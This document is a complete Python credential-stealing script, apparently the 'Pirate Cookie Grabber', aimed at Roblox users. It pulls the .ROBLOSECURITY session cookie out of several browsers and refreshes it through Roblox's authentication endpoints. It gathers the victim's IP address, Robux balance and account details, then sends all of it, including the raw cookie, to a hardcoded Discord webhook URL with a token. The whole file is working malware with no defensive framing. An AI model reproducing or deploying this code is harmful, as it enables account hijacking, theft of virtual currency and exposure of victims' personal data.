import os
import json
import base64
import browser_cookie3
import sqlite3
import subprocess
import shutil
from Crypto.Cipher import AES
from discordwebhook import Discord
import httpx
import re
import requests
import robloxpy

# Define webhook URL
webhook_url = 'https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CNbI4hbL0FRr66hJjmU92DXbyDcp0Z970RbPL9H4Nd5WzY06xiF8nPGGMp'

# Function to get encrypted cookies (working across all platforms)
def get_encrypted_cookies():
    data = []  # Store all cookies for Roblox

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookie.value)
                return data
    except:
        pass

    return None

# Function to fetch local IP
def get_local_ip():
    ip = requests.get('http://api.ipify.org').text
    return ip

# Function to refresh Roblox cookies (working cross-platform)
def refresh_cookie(auth_cookie):
    csrf_token = generate_csrf_token(auth_cookie)
    headers, cookies = generate_headers(csrf_token, auth_cookie)

    req = httpx.post("https://auth.roblox.com/v1/authentication-ticket",
                     headers=headers, cookies=cookies, json={})
    auth_ticket = req.headers.get("rbx-authentication-ticket", "Failed to get authentication ticket")

    headers.update({"RBXAuthenticationNegotiation": "1"})

    req1 = httpx.post("https://auth.roblox.com/v1/authentication-ticket/redeem",
                      headers=headers, json={"authenticationTicket": auth_ticket})
    new_auth_cookie = re.search(".ROBLOSECURITY=(.*?);", req1.headers["set-cookie"]).group(1)

    return new_auth_cookie

# Function to generate CSRF token for authentication
def generate_csrf_token(auth_cookie):
    csrf_req = httpx.get("https://www.roblox.com/home", cookies={".ROBLOSECURITY": auth_cookie})
    csrf_txt = csrf_req.text.split("<meta name=\"csrf-token\" data-token=\"")[1].split("\" />")[0]
    return csrf_txt

# Function to generate headers for requests
def generate_headers(csrf_token, auth_cookie):
    headers = {
        "Content-Type": "application/json",
        "user-agent": "Roblox/WinInet",
        "origin": "https://www.roblox.com",
        "referer": "https://www.roblox.com/my/account",
        "x-csrf-token": csrf_token
    }

    cookies = {".ROBLOSECURITY": auth_cookie}

    return headers, cookies

# Main script logic
if __name__ == "__main__":
    cookie = get_encrypted_cookies()
    if cookie is None:
        print("No valid Roblox cookie found.")
        exit(1)

    roblox_cookie = cookie[0]  # Assuming the first cookie is valid
    ip_address = get_local_ip()

    # Validate the Roblox cookie
    check = robloxpy.Utils.CheckCookie(roblox_cookie).lower()
    if check != "valid cookie":
        roblox_cookie = refresh_cookie(roblox_cookie)

    # Fetch user details from Roblox API
    info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie}).text)
    roblox_id = info["UserID"]
    rap = robloxpy.User.External.GetRAP(roblox_id)
    friends = robloxpy.User.Friends.External.GetCount(roblox_id)
    age = robloxpy.User.External.GetAge(roblox_id)
    creation_date = robloxpy.User.External.CreationDate(roblox_id)
    rolimons = f"https://www.rolimons.com/player/{roblox_id}"
    roblox_profile = f"https://web.roblox.com/users/{roblox_id}/profile"
    headshot_raw = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={roblox_id}&size=420x420&format=Png&isCircular=false").text
    headshot_json = json.loads(headshot_raw)
    headshot = headshot_json["data"][0]["imageUrl"]

    username = info['UserName']
    robux = requests.get("https://economy.roblox.com/v1/user/currency", cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
    premium_status = info['IsPremium']

    # Post data to Discord webhook
    discord = Discord(url=webhook_url)
    discord.post(
        username="BOT - Pirate ðŸª",
        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
        embeds=[
            {
                "title": "ðŸ’¸ +1 Result Account ðŸ•¯ï¸",
                "thumbnail": {"url": headshot},
                "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
                "fields": [
                    {"name": "Username", "value": f"```{username}```", "inline": True},
                    {"name": "Robux Balance", "value": f"```{robux}```", "inline": True},
                    {"name": "Premium Status", "value": f"```{premium_status}```", "inline": True},
                    {"name": "Creation Date", "value": f"```{creation_date}```", "inline": True},
                    {"name": "RAP", "value": f"```{rap}```", "inline": True},
                    {"name": "Friends", "value": f"```{friends}```", "inline": True},
                    {"name": "Account Age", "value": f"```{age}```", "inline": True},
                    {"name": "IP Address", "value": f"```{ip_address}```", "inline": True},
                ],
            }
        ],
    )

    discord.post(
        username="BOT - Ovion ðŸª",
        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
        embeds=[
            {"title": ".ROBLOSECURITY", "description": f"```{roblox_cookie}```"}
        ],
                )
